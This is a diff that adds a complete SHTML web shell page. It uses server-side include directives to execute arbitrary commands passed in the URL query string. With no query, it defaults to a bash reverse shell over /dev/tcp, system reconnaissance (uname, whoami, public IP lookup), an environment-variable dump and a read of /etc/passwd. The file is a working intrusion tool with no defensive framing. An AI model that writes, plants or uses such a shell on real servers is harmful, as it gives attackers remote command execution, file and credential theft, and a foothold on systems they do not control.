@@ -1,1 +1,248 @@
-asda
+
+<!--#config errmsg="[Error]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1" --> 
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="uanmequery" value="uname -a" --> 
+<!--#else -->
+<!--#set var="uanmequery" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="currentpath" value="pwd" --> 
+<!--#else -->
+<!--#set var="currentpath" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="currentuser" value="whoami" --> 
+<!--#else -->
+<!--#set var="currentuser" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="publicip" value="curl ifconfig.me" --> 
+<!--#else -->
+<!--#set var="publicip" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="directorylist" value="ls -ltrha" --> 
+<!--#else -->
+<!--#set var="directorylist" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="inc" value="/etc/passwd" -->
+<!--#else -->
+<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>
+Shell with Server Side Inclusion Shell
+</title>
+<style>
+    body {
+      background-color: black;
+      color: #fff;
+    }
+  
+    body,
+    td,
+    th {
+      font-family: Josefin Sans, sans-serif;
+      font-size: 13px;
+      margin: 0;
+      vertical-align: top;
+    }
+  
+    span {
+      font-weight: bolder;
+    }
+  
+    h1 {
+      padding: 0px 5px;
+      font: 14pt audiowide;
+      margin: 0px 0 0 0px;
+    }
+  
+    div.content {
+      padding: 0px;
+      margin: 0 0px;
+      background: #0F1010;
+      border: 1px solid;
+      border-radius: 5px;
+    }
+  
+    a {
+      text-decoration: none;
+      color: white;
+    }
+  
+    .ml1 {
+      border: 1px solid;
+      padding: px;
+      margin: 0;
+      overflow: auto;
+    }
+  
+    .bigarea {
+      width: 100%;
+      height: 250px;
+      margin-top: 0px;
+      border-radius: 10px;
+      border-color: ;
+      background: #2F2F2F;
+    }
+  
+    input,
+    textarea,
+    select {
+      word-break: break-all;
+      margin-top: 0;
+      color: #edeff0;
+      background-color: black;
+      border-radius: 5px;
+      border: 1px solid;
+      font: 10pt arial, "Courier New";
+    }
+  
+    .area123 {
+      margin: 10px;
+      word-break: break-all;
+      padding: 10px;
+      color: #e6e7e8;
+      background-color: black;
+      border-radius: 5px;
+      border: 1px solid;
+      font: 10pt arial, "Courier New";
+    }
+  
+    input[type="button"]:hover,
+    input[type="submit"]:hover {
+      background-color: #094F60;
+      color: black;
+      text-decoration: none;
+    }
+  
+    form {
+      margin: 0px;
+      background: #0F1010;
+    }
+  
+    #toolsTbl {
+      text-align: center;
+    }
+  
+    .toolsInp {
+      width: 80%;
+      background: black;
+      border-radius: 5px;
+      border-color: white;
+    }
+  
+    .main th {
+      text-align: left;
+      background-color: ;
+    }
+  
+    .main tr:hover {
+      background: white;
+      ;
+      border: 5px solid;
+      border-color: white;
+    }
+  
+    .main td,
+    th {
+      vertical-align: middle;
+    }
+  
+    .menu {
+      height: 30px;
+      border-radius: 10px;
+    }
+  
+    .menu th {
+      padding: 1px;
+      border-radius: 5px;
+      background: ;
+      -webkit-transform: rotate(20deg);
+      -moz-transform: rotate(20deg);
+      -o-transform: rotate(20deg);
+      -ms-transform: rotate(20deg);
+      transform: rotate(20deg);
+    }
+  </style>
+</head>
+<body bgcolor=#000000>
+<br>
+<div align=left width=100% border=0 style=background-color:#000000; class="area123">
+<center><b><font size=+1>SHTML Shell</font></b></center>
+<br>
+<b><font color=white>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
+<b><font color=white>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
+<b><font color=white>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
+<b><font color=white>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
+<b><font color=white>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
+<b><font color=white>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
+<b><font color=white>Server Name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#exec cmd=$uanmequery --></b><br>
+<b><font color=white>Current Working Directory</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#exec cmd=$currentpath --></b><br>
+<b><font color=white>Current User</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#exec cmd=$currentuser --></b><br>
+<b><font color=white>Public IP</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#exec cmd=$publicip --></b><br>
+<br>
+</div>
+<br>
+
+
+
+<div align=left width=100% border=0 style=background-color:#000000; class="area123">
+<b><font size=+1>Current Directory</font></b>
+<br>
+<pre>
+<!--#exec cmd=$directorylist -->
+</pre>
+<br>
+</div>
+<br>
+
+<div align=left width=100% border=0 style=background-color:#000000; class="area123">
+<b><font size=+1>Environment Variable Dump</font></b>
+<br>
+<pre>
+<!--#printenv -->
+</pre>
+<br>
+</div>
+
+
+<br>
+<div align=left width=100% border=0 style=background-color:#000000; class="area123">
+<b><font size=+1>Reverse Shell or Command Output</font></b>
+<br><br>
+<b><font color=white>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br><br>
+<pre>
+<!--#exec cmd=$shl -->
+</pre>
+<br>
+</div>
+<br>
+<div align=left width=100% border=0 style=background-color:#000000; class="area123">
+<b><font size=+1>Read File</font></b>
+<br><br>
+<b><font color=white>Current File Absolute Path</font></b>:&nbsp;&nbsp;&nbsp;<!--#echo var=SCRIPT_FILENAME -->&nbsp;<br>
+<br>
+<b><font color=white>Trying to Read File</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
+<br>
+<pre>
+<!--#include virtual=$inc -->
+</pre>
+<br>
+</div>
+<br>
+</body>
+</html>
